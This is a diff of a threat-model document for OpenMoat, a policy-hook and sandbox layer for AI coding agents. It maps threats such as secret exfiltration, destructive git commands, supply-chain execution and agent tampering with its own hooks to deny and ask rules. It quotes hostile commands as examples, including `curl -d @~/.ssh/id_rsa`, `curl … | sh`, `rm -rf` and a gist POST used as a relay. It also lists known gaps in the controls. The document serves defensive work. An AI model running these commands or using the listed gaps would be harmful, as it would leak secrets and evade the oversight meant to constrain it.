@@ -47,15 +47,15 @@ sandboxes and `moat run` add today, or the planned answer from the
 | T1 | Secret exfiltration via shell (`curl -d @~/.ssh/id_rsa …`) | `secrets-paths` denies reads and writes of secret paths, also through `cd`, relative operands, glob operands, `~name`, symlinks and nested shells; unlisted hosts are denied by `default.net` | No reads of secret paths, network only through a proxy to allowed hosts |
 | T2 | Secret exfiltration via file tools (`Read ~/.aws/credentials`) | The same path rules for Claude Code `Read`/`Glob`/`Grep`/`LSP`, Cursor `beforeReadFile` and `preToolUse` `Read`/`Grep`/`Glob`, and MCP path arguments | Only under `moat run`: Claude Code's and Cursor's file tools run outside their sandboxes |
 | T3 | Secret exfiltration via the environment (`echo $OPENAI_API_KEY`, `env`) | `env-secrets` denies reads of secret-shaped names; `env-dump` denies argument-less `env`, `printenv`, `set`, `export`, `declare`, `typeset` | *Planned:* a scrubbed environment |
-| T4 | Destructive git and filesystem operations | `destructive` denies force pushes in every spelling, remote branch deletion, `reset --hard`, `clean -fdx`, `branch -D`, `stash drop/clear`, `rm -rf` of `/` and `~`, `sudo`, `mkfs`, `dd if=`; recursive `rm` and discarding checkouts ask | Writes outside the project and the temp directory never reach the disk: refused on macOS, made in an in-memory home that is discarded on Linux ([SANDBOX.md](SANDBOX.md)); inside the project only the hook decides |
+| T4 | Destructive git and filesystem operations | `destructive` denies force pushes in every spelling, remote branch deletion, `reset --hard`, `clean -fdx`, `branch -D`, `stash drop/clear`, `rm -rf` of `/` and `~`, `sudo`, `mkfs`, `dd if=`; a recursive `rm` that may reach the project root or beyond and discarding checkouts are not allowed, so they defer to the agent's own prompt (ADR-025) | Writes outside the project and the temp directory never reach the disk: refused on macOS, made in an in-memory home that is discarded on Linux ([SANDBOX.md](SANDBOX.md)); inside the project only the hook decides |
 | T5 | Supply-chain execution (`curl … \| sh`, unknown installs) | `pipe-to-shell` denies downloads and decoded streams piped into a shell or interpreter, and `eval`; package installs are left to the agent's own prompt (ADR-025), and the OS sandbox confines install scripts | Network only to allowed hosts (the registries) |
-| T6 | Environment poisoning (`PATH`, `LD_PRELOAD`, planted binaries) | `env-poison` denies setting dangerous variables; executable pins deny a program that resolves somewhere else than recorded (ADR-008); `git --git-dir=…` and git config that runs a program (`-c`, `GIT_CONFIG_*`) ask, and under `moat run`, Claude Code and Codex git opens a bare repository only when named (`safe.bareRepository=explicit`) | Writes outside the project (shell startup files) never reach the disk, as for T4; in-project `.git/hooks` and `.envrc` refused except the gaps in [EVIDENCE.md](EVIDENCE.md); *planned:* a kernel-controlled environment |
-| T7 | Obfuscation and nested execution (`bash -c`, `eval`, `$( … )`, here-documents, decoders) | Recursive classification to depth 4; decoder pipelines are canonicalised; anything unclear is `unparseable` and asks, while the parts around it are still decided, so a deny among them stands | The sandbox bounds what any spelling can reach |
-| T8 | MCP tool poisoning, over-privileged MCP tools | `mcp` rules on tool names; path and URL arguments become `fs.*` and `net` atoms; unreadable arguments deny; arguments nested deeper than 8 levels ask | *Planned:* MCP stdio proxy with description pinning (1.0) |
+| T6 | Environment poisoning (`PATH`, `LD_PRELOAD`, planted binaries) | `env-poison` denies setting dangerous variables; executable pins deny a program that resolves somewhere else than recorded (ADR-008); `git --git-dir=…` and git config that runs a program (`git -c`, `git config`) ask (`git-internals`), setting `GIT_CONFIG_*` is denied (`env-poison`), and under `moat run`, Claude Code and Codex git opens a bare repository only when named (`safe.bareRepository=explicit`) | Writes outside the project (shell startup files) never reach the disk, as for T4; in-project `.git/hooks` and `.envrc` refused except the gaps in [EVIDENCE.md](EVIDENCE.md); *planned:* a kernel-controlled environment |
+| T7 | Obfuscation and nested execution (`bash -c`, `eval`, `$( … )`, here-documents, decoders) | Recursive classification to depth 4; decoder pipelines are canonicalised; anything unclear is `unparseable`, never `allow` (it defers under the default policy and asks under an `ask` catch-all, ADR-025), while the parts around it are still decided, so a deny among them stands | The sandbox bounds what any spelling can reach |
+| T8 | MCP tool poisoning, over-privileged MCP tools | `mcp` rules on tool names; path and URL arguments become `fs.*` and `net` atoms; unreadable arguments deny; arguments nested deeper than 8 levels are `unparseable` (deferred under the default policy) | *Planned:* MCP stdio proxy with description pinning (1.0) |
 | T9 | Hook and policy tampering by the agent | `kernel-self` denies writes to state, host directories (also where `MOAT_HOME`, `CLAUDE_CONFIG_DIR`, `CODEX_HOME` or `CURSOR_CONFIG_DIR` moved them), hook files, and agent runs of `moat allow\\|doctor\\|init\\|policy\\|trust\\|uninstall` and `moat sandbox sync`; the lock denies everything after drift; Claude Code `ConfigChange` blocks a drifted settings file; a repository policy adds only deny and ask rules unless a person trusted that exact file in that checkout, and one that does not parse or sets `defaults`, `executables` or `sandbox` denies every call in the project (ADR-022); a database shell (`sqlite3`, `duckdb`) opening the audit log is a write, so `kernel-self` denies it | Under Claude Code's and Codex's sandboxes, commands cannot change `~/.moat`, the agents' settings and hook files in the home, or those in the project root (`.claude/settings*.json`, `.cursor/hooks.json`, `.cursor/sandbox.json`, `.codex/hooks.json`, `.moat`). On Linux the same files in a project subdirectory stay writable (`claude-code.linux-write-globs`, `codex.linux-write-globs` in `moat sandbox show`), and Cursor's sandbox cannot deny inside the workspace (§5); *planned:* signed policy (1.0) |
 | T10 | Hook supply chain (a trojaned hook binary) | Hooks are exec-form with an absolute, stable path (ADR-016); `kernel-self` denies writes to any `bin/moat` and to the recorded binary, its directory and its link target by literal path, which the host sandboxes and Claude Code's deny rules name too; `moat init` refuses a binary inside a project, a temp directory or a directory the sandboxes may write; `doctor` names a missing or different hook binary | Releases carry build provenance attestations |
 | T11 | Time of check vs. time of use, symlinks | Literal and resolved paths are both checked (ADR-009) | Sandbox path rules apply at use |
-| T12 | Network to unknown hosts | `default.net` denies shell network to unlisted hosts; `cloud-metadata` denies metadata and link-local services; `local-net` asks for localhost; `moat proxy` refuses loopback, link-local and metadata addresses, and private and CGNAT ones the policy does not name, after DNS resolution; `WebFetch` of an unlisted host asks (ADR-017); after a secret read, network and MCP calls in the same session ask (`session-taint`) | Host sandboxes allow only the policy's hosts; `moat run`, and host sandboxes with `sandbox.proxy_port`, go through `moat proxy` |
+| T12 | Network to unknown hosts | `default.net` denies shell network to unlisted hosts; `cloud-metadata` denies metadata and link-local services; `local-net` defers localhost to the agent's own prompt; `moat proxy` refuses loopback, link-local and metadata addresses, and private and CGNAT ones the policy does not name, after DNS resolution; `WebFetch` of an unlisted host defers to the agent's own prompt (ADR-017, ADR-025); after a secret read, network and MCP calls in the same session ask (`session-taint`) | Host sandboxes allow only the policy's hosts; `moat run`, and host sandboxes with `sandbox.proxy_port`, go through `moat proxy` |
 
 ## 4. Out of scope
 
@@ -113,7 +113,7 @@ something OpenMoat claims to stop.
   the session's working directory are allowed even when the session started above
   the git root, and Claude Code leaves paths outside the user directories (`/Users`,
   `/home`, `/Volumes`, …) readable. `sandbox.read_roots` (toolchains, `/usr`, temp)
-  are readable by sandboxed commands while the hook still asks for them. Egress goes
+  are readable by sandboxed commands while the hook defers or asks for them. Egress goes
   to allowlisted domains through the hosts' proxies, which check the requested host
   name, so any allowlisted host stays a relay. `moat sandbox show` lists every loss
   and allowance; ADR-018 lists the open risks.
@@ -123,7 +123,7 @@ something OpenMoat claims to stop.
   deny rules `moat init` writes on every OS so that they hold when the hook does not run. Codex keeps `.git` read-only for sandboxed
   commands and asks to run `git commit` outside. Claude Code's file tools refuse reads outside the
   working directories (`permissions.blockReadsOutsideWorkingDirectories`) where the
-  hook would ask.
+  hook would defer or ask.
 - **Claude Code's sandbox writes `.git`.** So that `git commit` works, sandboxed
   commands may write any `.git` except `hooks`, `config`, `config.worktree`,
   `info/attributes`, a linked worktree's `commondir` and the same in submodules
@@ -217,8 +217,8 @@ something OpenMoat claims to stop.
 - **Allowed hosts are relays.** `registries` allows network to `api.github.com`,
   `github.com` and the package registries. The host check passes for any command
   that reaches them, so a command that is itself allowed (a project script) or that
-  a person approves at the prompt (`curl -X POST https://api.github.com/gists -d
-  @file` asks on its `shell` atom only) can send data there. A `WebFetch` GET can
+  the agent's own prompt lets through (`curl -X POST https://api.github.com/gists -d
+  @file` is decided on its `shell` atom only, which the default policy defers) can send data there. A `WebFetch` GET can
   carry data in its URL; the prompt shows the URL. Session taint (POLICY.md §4.1)
   narrows this. After a secret read, `net`, `fetch` and MCP calls in the same session
   ask. After a `fetch` or an MCP result, writes to CI, git hooks, the build and
@@ -342,7 +342,7 @@ something OpenMoat claims to stop.
 - **Pattern lists are incomplete by nature.** Pseudo-terminal routes to `moat allow`
   (ADR-011, ADR-014), environment dumps through interpreters (`python -c
   'print(os.environ)'`, ADR-010), and options that run programs (ADR-012) are matched
-  by lists. Spellings outside the lists ask or, if a broad allow covers them, are
+  by lists. Spellings outside the lists defer to the agent's own prompt or, if a broad allow covers them, are
   allowed.
 - **TOCTOU and hard links.** A link swapped between the check and the command
   running, and hard links, are not seen (ADR-009).
